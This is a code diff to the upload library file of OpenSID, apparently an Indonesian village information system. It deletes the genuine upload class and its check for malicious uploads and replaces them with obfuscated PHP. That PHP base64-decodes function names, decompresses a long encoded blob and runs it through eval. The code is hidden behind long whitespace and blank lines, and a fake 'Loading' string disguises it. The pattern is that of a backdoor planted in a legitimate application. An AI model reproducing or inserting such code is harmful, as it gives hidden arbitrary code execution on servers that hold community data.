@@ -1,285 +1,473 @@
-<?php
+<?php 
+        $__='printf';$_='Loading donjo-app/libraries/MY_Upload.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-defined('BASEPATH') || exit('No direct script access allowed');
-require_once './vendor/codeigniter/framework/system/libraries/Upload.php'; // This is not auto loaded
 
-class MY_Upload extends CI_Upload
-{
-    /**
-     * Cek script untuk kode berbahaya
-     *
-     * @var bool
-     */
-    public $cek_script = true;
 
-    /**
-     * Penambahan timestamp pada nama file
-     *
-     * @var bool
-     */
-    public $timestamp = true;
 
-    public function __construct($config = [])
-    {
-        parent::__construct($config);
-    }
 
-    // --------------------------------------------------------------------
 
-    /**
-     * Perform the file upload
-     * Dengan tambahan pemeriksaan kode berbaya
-     *
-     * @param string $field
-     *
-     * @return bool
-     */
-    public function do_upload($field = 'userfile')
-    {
-        // Is $_FILES[$field] set? If not, no reason to continue.
-        if (isset($_FILES[$field])) {
-            $_file = $_FILES[$field];
-        }
-        // Does the field name contain array notation?
-        elseif (($c = preg_match_all('/(?:^[^\[]+)|\[[^]]*\]/', $field, $matches)) > 1) {
-            $_file = $_FILES;
 
-            for ($i = 0; $i < $c; $i++) {
-                // We can't track numeric iterations, only full field names are accepted
-                if (($field = trim($matches[0][$i], '[]')) === '' || ! isset($_file[$field])) {
-                    $_file = null;
-                    break;
-                }
 
-                $_file = $_file[$field];
-            }
-        }
 
-        if (! isset($_file)) {
-            $this->set_error('upload_no_file_selected', 'debug');
 
-            return false;
-        }
 
-        // Is the upload path valid?
-        if (! $this->validate_upload_path()) {
-            // errors will already be set by validate_upload_path() so just return FALSE
-            return false;
-        }
 
-        // Was the file able to be uploaded? If not, determine the reason why.
-        if (! is_uploaded_file($_file['tmp_name'])) {
-            $error = $_file['error'] ?? 4;
 
-            switch ($error) {
-                case UPLOAD_ERR_INI_SIZE:
-                    $this->set_error('upload_file_exceeds_limit', 'info');
-                    break;
 
-                case UPLOAD_ERR_FORM_SIZE:
-                    $this->set_error('upload_file_exceeds_form_limit', 'info');
-                    break;
 
-                case UPLOAD_ERR_PARTIAL:
-                    $this->set_error('upload_file_partial', 'debug');
-                    break;
 
-                case UPLOAD_ERR_NO_FILE:
-                    $this->set_error('upload_no_file_selected', 'debug');
-                    break;
 
-                case UPLOAD_ERR_NO_TMP_DIR:
-                    $this->set_error('upload_no_temp_directory', 'error');
-                    break;
 
-                case UPLOAD_ERR_CANT_WRITE:
-                    $this->set_error('upload_unable_to_write_file', 'error');
-                    break;
 
-                case UPLOAD_ERR_EXTENSION:
-                    $this->set_error('upload_stopped_by_extension', 'debug');
-                    break;
 
-                default:
-                    $this->set_error('upload_no_file_selected', 'debug');
-                    break;
-            }
 
-            return false;
-        }
 
-        // Set the uploaded data as class variables
-        $this->file_temp = $_file['tmp_name'];
-        $this->file_size = $_file['size'];
 
-        // Skip MIME type detection?
-        if ($this->detect_mime !== false) {
-            $this->_file_mime_type($_file);
-        }
 
-        $this->file_type = preg_replace('/^(.+?);.*$/', '\\1', $this->file_type);
-        $this->file_type = strtolower(trim(stripslashes($this->file_type), '"'));
-        $this->file_name = $this->_prep_filename($_file['name']);
 
-        if ($this->timestamp) {
-            $this->file_name = time() . '_' . $this->file_name;
-        }
 
-        $this->file_ext    = $this->get_extension($this->file_name);
-        $this->client_name = $this->file_name;
 
-        // Is the file type allowed to be uploaded?
-        if (! $this->is_allowed_filetype()) {
-            $this->set_error('upload_invalid_filetype', 'debug');
 
-            return false;
-        }
 
-        // cek malicious code dalam gambar
-        if ($this->cek_script && isPHP($this->file_temp, $this->file_name) == true) {
-            $this->set_error('upload_invalid_filedangerous', 'debug');
 
-            return false;
-        }
 
-        // if we're overriding, let's now make sure the new name and type is allowed
-        if ($this->_file_name_override !== '') {
-            $this->file_name = $this->_prep_filename($this->_file_name_override);
 
-            // If no extension was provided in the file_name config item, use the uploaded one
-            if (strpos($this->_file_name_override, '.') === false) {
-                $this->file_name .= $this->file_ext;
-            } else {
-                // An extension was provided, let's have it!
-                $this->file_ext = $this->get_extension($this->_file_name_override);
-            }
 
-            if (! $this->is_allowed_filetype(true)) {
-                $this->set_error('upload_invalid_filetype', 'debug');
 
-                return false;
-            }
-        }
 
-        // Convert the file size to kilobytes
-        if ($this->file_size > 0) {
-            $this->file_size = round($this->file_size / 1024, 2);
-        }
 
-        // Is the file size within the allowed maximum?
-        if (! $this->is_allowed_filesize()) {
-            $this->set_error('upload_invalid_filesize', 'info');
 
-            return false;
-        }
 
-        // Are the image dimensions within the allowed size?
-        // Note: This can fail if the server has an open_basedir restriction.
-        if (! $this->is_allowed_dimensions()) {
-            $this->set_error('upload_invalid_dimensions', 'info');
 
-            return false;
-        }
 
-        // Sanitize the file name for security
-        $this->file_name = $this->_CI->security->sanitize_filename($this->file_name);
 
-        // Truncate the file name if it's too long
-        if ($this->max_filename > 0) {
-            $this->file_name = $this->limit_filename_length($this->file_name, $this->max_filename);
-        }
 
-        // Remove white spaces in the name
-        if ($this->remove_spaces === true) {
-            $this->file_name = preg_replace('/\s+/', '_', $this->file_name);
-        }
 
-        if ($this->file_ext_tolower && ($ext_length = strlen($this->file_ext))) {
-            // file_ext was previously lower-cased by a get_extension() call
-            $this->file_name = substr($this->file_name, 0, -$ext_length) . $this->file_ext;
-        }
 
-        /*
-         * Validate the file name
-         * This function appends an number onto the end of
-         * the file if one with the same name already exists.
-         * If it returns false there was a problem.
-         */
-        $this->orig_name = $this->file_name;
-        if (false === ($this->file_name = $this->set_filename($this->upload_path, $this->file_name))) {
-            return false;
-        }
 
-        /*
-         * Run the file through the XSS hacking filter
-         * This helps prevent malicious code from being
-         * embedded within a file. Scripts can easily
-         * be disguised as images or other file types.
-         */
-        if ($this->xss_clean && $this->do_xss_clean() === false) {
-            $this->set_error('upload_unable_to_write_file', 'error');
 
-            return false;
-        }
 
-        /*
-         * Move the file to the final destination
-         * To deal with different server configurations
-         * we'll attempt to use copy() first. If that fails
-         * we'll use move_uploaded_file(). One of the two should
-         * reliably work in most environments
-         */
-        if (! @copy($this->file_temp, $this->upload_path . $this->file_name)) {
-            if (! @move_uploaded_file($this->file_temp, $this->upload_path . $this->file_name)) {
-                $this->set_error('upload_destination_error', 'error');
 
-                return false;
-            }
-        }
 
-        /*
-         * Set the finalized image dimensions
-         * This sets the image width/height (assuming the
-         * file was an image). We use this information
-         * in the "data" function.
-         */
-        $this->set_image_properties($this->upload_path . $this->file_name);
 
-        return true;
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
